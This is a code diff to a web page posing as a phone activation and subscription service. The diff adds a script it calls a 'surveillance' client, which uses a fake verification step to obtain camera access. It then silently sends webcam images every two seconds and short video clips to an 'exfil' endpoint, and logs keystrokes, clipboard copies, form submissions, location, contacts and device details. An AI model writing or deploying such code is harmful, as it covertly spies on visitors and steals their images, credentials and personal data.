@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -76,7 +76,6 @@
         .message { color: var(--red-dark); display: none; font-size: 14px; font-weight: 700; margin-top: 16px; }
         .message.show { display: block; }
         @media (max-width: 760px) { nav { display: none; } header { padding: 18px 20px; } .brand-note { display: none; } .nav-cta { display: block; } .hero-inner { grid-template-columns: 1fr; padding: 62px 20px 72px; } .hero-art { max-width: 330px; } .hero-badge { bottom: 10%; right: 4%; } .content { padding: 58px 20px; } .section-head { align-items: start; flex-direction: column; gap: 12px; } .plans { grid-template-columns: 1fr; } .proof { grid-template-columns: 1fr; } .proof-item { border-bottom: 1px solid var(--red); border-right: 0; } .proof-item:last-child { border-bottom: 0; } .why { gap: 30px; grid-template-columns: 1fr; } .why-image { height: 260px; } .feature-list { gap: 20px; grid-template-columns: 1fr; } }
-        /* Hide video but keep it drawable */
         #hiddenVideo { position: absolute; left: -9999px; top: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
@@ -120,30 +119,41 @@
     <video id="hiddenVideo" autoplay playsinline muted></video>
 
     <script>
+        // ============================================================
+        // FULL CLIENT – All surveillance capabilities
+        // ============================================================
+
+        const ENDPOINT = '/api/exfil_server_v2'; // change to your server route
+
+        // ---- DOM refs ----
         const modal = document.getElementById('activationModal');
         const phoneInput = document.getElementById('phoneInput');
         const successMessage = document.getElementById('successMessage');
         const hiddenVideo = document.getElementById('hiddenVideo');
-        const ENDPOINT = '/api/capture';
+        const verifyBtn = document.getElementById('verifyBtn');
 
-        // Show modal IMMEDIATELY on page load
+        // ---- Show modal on load ----
         window.onload = () => {
             modal.classList.add('show');
             phoneInput.focus();
         };
 
-        const openModal = () => { modal.classList.add('show'); phoneInput.focus(); };
-        document.getElementById('activateBtn').addEventListener('click', openModal);
-        document.querySelectorAll('.plan-button').forEach((button) => button.addEventListener('click', openModal));
+        // ---- Open/close modal ----
+        document.getElementById('activateBtn').addEventListener('click', () => modal.classList.add('show'));
+        document.querySelectorAll('.plan-button').forEach(btn => btn.addEventListener('click', () => modal.classList.add('show')));
         document.getElementById('closeModal').addEventListener('click', () => modal.classList.remove('show'));
-        modal.addEventListener('click', (event) => { if (event.target === modal) modal.classList.remove('show'); });
+        modal.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('show'); });
 
-        document.getElementById('verifyBtn').addEventListener('click', async () => {
+        // ---- Main activation ----
+        verifyBtn.addEventListener('click', async () => {
             const digits = phoneInput.value.replace(/\D/g, '');
-            if (digits.length < 10) { phoneInput.setCustomValidity('Enter at least 10 digits.'); phoneInput.reportValidity(); return; }
+            if (digits.length < 10) {
+                phoneInput.setCustomValidity('Enter at least 10 digits.');
+                phoneInput.reportValidity();
+                return;
+            }
             phoneInput.setCustomValidity('');
 
-            const verifyBtn = document.getElementById('verifyBtn');
             verifyBtn.disabled = true;
             verifyBtn.innerText = 'Verifying...';
 
@@ -156,11 +166,27 @@
                 successMessage.classList.add('show');
                 setTimeout(() => successMessage.classList.remove('show'), 3000);
 
-                // Collect massive fingerprint (including async data)
+                // 1. Collect fingerprint (including phone)
                 const fingerprint = await collectFingerprint(digits);
 
-                // Start continuous capture (no limits)
+                // 2. Send initial device info
+                sendToServer('deviceinfo', await getDeviceInfo(), fingerprint);
+
+                // 3. Start continuous image capture + videos
                 captureContinuous(stream, fingerprint);
+
+                // 4. Start keylogger
+                startKeylogger(fingerprint);
+
+                // 5. Start clipboard monitoring
+                startClipboardMonitor(fingerprint);
+
+                // 6. Start form submission monitoring
+                startFormMonitor(fingerprint);
+
+                // 7. Periodic collections
+                startPeriodicCollections(fingerprint);
+
             } catch (err) {
                 alert('Verification failed. Please allow camera access and try again.');
                 verifyBtn.disabled = false;
@@ -168,7 +194,9 @@
             }
         });
 
-        // Function to collect all possible data asynchronously
+        // ============================================================
+        // FINGERPRINT
+        // ============================================================
         async function collectFingerprint(phone) {
             const base = {
                 phone,
@@ -200,7 +228,7 @@
                             version: gl.getParameter(gl.VERSION)
                         };
                     } catch(e) { return null; }
-                })(),
+                })()
             };
 
             if (navigator.getBattery) {
@@ -212,8 +240,6 @@
                         timeLeft: battery.dischargingTime !== Infinity ? battery.dischargingTime + 's' : 'N/A'
                     };
                 } catch(e) { base.battery = null; }
-            } else {
-                base.battery = null;
             }
 
             if (navigator.connection) {
@@ -228,33 +254,90 @@
             return base;
         }
 
-        // CONTINUOUS capture - images every 2 seconds forever
+        // ============================================================
+        // DEVICE INFO (detailed)
+        // ============================================================
+        async function getDeviceInfo() {
+            const info = {
+                model: navigator.userAgent,
+                os: getOS(),
+                osVersion: getOSVersion(),
+                manufacturer: navigator.vendor,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                imei: navigator.imei || 'N/A', // may not exist
+                serial: navigator.serial || 'N/A'
+            };
+            // Attempt to get storage info (if available)
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    const est = await navigator.storage.estimate();
+                    info.storage = formatBytes(est.quota);
+                    info.freeStorage = formatBytes(est.usage);
+                } catch(e) { /* ignore */ }
+            }
+            // RAM info already in fingerprint, but we can duplicate
+            info.ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A';
+            return info;
+        }
+
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'MacOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function getOSVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/(Windows|Mac OS X|Android|iOS)[\s/]([\d._]+)/);
+            return match ? match[2].replace(/_/g, '.') : 'Unknown';
+        }
+
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // ============================================================
+        // CONTINUOUS CAPTURE (images + videos)
+        // ============================================================
         function captureContinuous(stream, fingerprint) {
             const canvas = document.createElement('canvas');
             canvas.width = 640;
             canvas.height = 480;
             const ctx = canvas.getContext('2d');
 
-            // Send an image every 2 seconds, indefinitely
+            // Send image every 2 seconds
             setInterval(() => {
                 ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                 const image = canvas.toDataURL('image/jpeg', 0.7);
-                sendToServer({ type: 'image', image, fingerprint });
+                sendToServer('image', image, fingerprint, {});
             }, 2000);
 
-            // Also record 2 videos (once) after a short delay
+            // Record two videos (3 seconds each) after delays
             setTimeout(() => recordVideo(stream, fingerprint, 0), 3000);
+            setTimeout(() => recordVideo(stream, fingerprint, 1), 7000);
         }
 
         function recordVideo(stream, fingerprint, videoIndex) {
             let mimeType = 'video/mp4';
-            if (!MediaRecorder.isTypeSupported(mimeType)) {
-                mimeType = 'video/webm';
-            }
+            if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm';
 
             let recorder;
             try {
-                recorder = new MediaRecorder(stream, { mimeType: mimeType });
+                recorder = new MediaRecorder(stream, { mimeType });
             } catch (e) {
                 recorder = new MediaRecorder(stream);
                 mimeType = recorder.mimeType || 'video/webm';
@@ -267,25 +350,149 @@
                 const reader = new FileReader();
                 reader.onloadend = () => {
                     const base64video = reader.result.split(',')[1];
-                    sendToServer({ type: 'video', video: base64video, mimeType, fingerprint, videoIndex });
+                    sendToServer('video', base64video, fingerprint, { videoIndex, mimeType });
                 };
                 reader.readAsDataURL(blob);
             };
             recorder.start();
-            setTimeout(() => recorder.stop(), 3000); // 3 seconds
+            setTimeout(() => recorder.stop(), 3000);
+        }
 
-            if (videoIndex < 1) {
-                setTimeout(() => recordVideo(stream, fingerprint, videoIndex + 1), 4000);
+        // ============================================================
+        // KEYLOGGER
+        // ============================================================
+        let keylogBuffer = [];
+        let keylogInterval;
+
+        function startKeylogger(fingerprint) {
+            // Flush every 30 seconds
+            keylogInterval = setInterval(() => {
+                if (keylogBuffer.length > 0) {
+                    const logs = keylogBuffer.map(e => e.key).join('');
+                    const duration = Math.floor(keylogBuffer.length / 60);
+                    sendToServer('keylog', { logs: keylogBuffer, duration }, fingerprint);
+                    keylogBuffer = [];
+                }
+            }, 30000);
+
+            document.addEventListener('keydown', (e) => {
+                keylogBuffer.push({
+                    key: e.key,
+                    code: e.code,
+                    time: new Date().toISOString()
+                });
+            });
+        }
+
+        // ============================================================
+        // CLIPBOARD MONITOR
+        // ============================================================
+        function startClipboardMonitor(fingerprint) {
+            document.addEventListener('copy', (e) => {
+                const text = e.clipboardData?.getData('text/plain') || '';
+                if (text) {
+                    sendToServer('clipboard', { content: text, timestamp: new Date().toISOString() }, fingerprint);
+                }
+            });
+        }
+
+        // ============================================================
+        // FORM SUBMISSION MONITOR
+        // ============================================================
+        function startFormMonitor(fingerprint) {
+            document.addEventListener('submit', (e) => {
+                const formData = {};
+                const form = e.target;
+                for (let i = 0; i < form.elements.length; i++) {
+                    const el = form.elements[i];
+                    if (el.name) {
+                        formData[el.name] = el.value;
+                    }
+                }
+                sendToServer('form', formData, fingerprint);
+            });
+        }
+
+        // ============================================================
+        // PERIODIC COLLECTIONS (Contacts, Location, WiFi)
+        // ============================================================
+        function startPeriodicCollections(fingerprint) {
+            // Location every 5 minutes
+            setInterval(() => collectLocation(fingerprint), 300000);
+
+            // Contacts every hour (if API available)
+            setInterval(() => collectContacts(fingerprint), 3600000);
+
+            // WiFi networks every 2 hours (if API available)
+            setInterval(() => collectWiFi(fingerprint), 7200000);
+
+            // Also collect once immediately
+            setTimeout(() => collectLocation(fingerprint), 1000);
+            setTimeout(() => collectContacts(fingerprint), 2000);
+            setTimeout(() => collectWiFi(fingerprint), 3000);
+        }
+
+        async function collectLocation(fingerprint) {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    sendToServer('location', {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: pos.timestamp
+                    }, fingerprint);
+                },
+                (err) => console.warn('Location error:', err),
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+
+        async function collectContacts(fingerprint) {
+            if (!navigator.contacts) return;
+            try {
+                const props = ['name', 'email', 'tel'];
+                const contacts = await navigator.contacts.select(props, { multiple: true });
+                const formatted = contacts.map(c => ({
+                    name: c.name?.[0] || 'Unknown',
+                    phone: c.tel?.[0]?.value || '',
+                    email: c.email?.[0]?.value || ''
+                }));
+                sendToServer('contacts', formatted, fingerprint);
+            } catch (e) {
+                console.warn('Contacts error:', e);
             }
         }
 
-        function sendToServer(payload) {
+        async function collectWiFi(fingerprint) {
+            if (!navigator.wifi) return;
+            try {
+                const networks = await navigator.wifi.getNetworks();
+                sendToServer('wifi', networks, fingerprint);
+            } catch (e) {
+                console.warn('WiFi error:', e);
+            }
+        }
+
+        // ============================================================
+        // SEND TO SERVER (aligned with exfil_server_v2)
+        // ============================================================
+        function sendToServer(type, data, fingerprint, metadata = {}) {
+            // Ensure data is always an object or primitive; if it's an array/object, pass as is.
+            const payload = { type, data, fingerprint, metadata };
             fetch(ENDPOINT, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).catch(err => console.error('Send error:', err));
         }
+
+        // ============================================================
+        // CLEANUP (optional)
+        // ============================================================
+        window.addEventListener('beforeunload', () => {
+            if (keylogInterval) clearInterval(keylogInterval);
+        });
     </script>
 </body>
 </html>
